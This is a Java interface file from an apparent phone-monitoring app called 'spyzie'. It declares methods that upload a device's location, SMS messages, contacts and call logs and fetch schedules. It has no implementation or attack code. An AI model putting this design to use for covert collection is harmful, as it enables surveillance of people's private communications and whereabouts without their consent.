package com.tantd.spyzie.data.network;

import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.model.Event;
import com.tantd.spyzie.data.model.Location;
import com.tantd.spyzie.data.model.Sms;

import java.util.List;

import io.reactivex.Single;

/**
 * Created by tantd on 2/26/2020.
 */
public interface ApiManager {

    Single<List<Event>> getSchedules();

    void sendLocationData(Location location);

    void sendSmsData(Sms sms);

    void sendExceptionTracking(Error error);

    void sendContactsData(List<Contact> contacts);

    void sendCallsData(List<Call> calls);
}
